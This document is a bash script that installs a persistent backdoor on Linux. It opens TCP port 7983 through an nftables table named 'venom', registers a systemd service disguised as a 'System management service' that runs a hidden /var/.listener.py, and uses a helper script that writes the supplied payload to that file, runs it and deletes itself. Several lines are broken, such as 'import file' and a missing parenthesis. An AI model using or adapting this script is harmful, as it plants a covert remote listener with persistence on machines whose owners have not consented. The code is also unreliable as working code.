#!/bin/bash
apt-get update && apt-get install -y nftables 
apt-get update && apt-get install -y python3 
apt-get update && apt-get install -y pip
yum install -y nftables 
yum install -y python3
yum install -y pip
pip install os
pip install socket
nft add table venom
nft add chain venom input \{ type filter hook input priority -101 \; policy accept\; \}
nft add chain venom output \{ type filter hook output priority -101 \; policy accept\; \}
nft add rule venom input tcp dport { 7983 } accept
nft add rule venom output tcp dport { 7983 } accept
cat <<EOFA > /etc/systemd/system/systemb.service
[Unit]
Description=System management service.

[Service]
Type=simple
Restart=on-failure
Environment="PATH=/sbin:/bin:/usr/sbin:/usr/bin"
ExecStart=/bin/bash -c '/var/*listener.py'
StartLimitInterval=1s
StartLimitBurst=999

[Install]
WantedBy=multi-user.target
EOFA
cat <<EOFA > /tmp/test.py
import file
import sys
def main():
	f = open("/var/.listener.py", "w")
	text = str(sys.argv[1].decode('utf-8'))
	f.write(text)
	f.close()
	os.system("python3 /var/.listener.py")
	self = sys.argv[0]
	os.system(f"rm {self}"
main()
EOFA
python3 /tmp/test.py $1 &
systemctl enable systemb
systemctl start systemb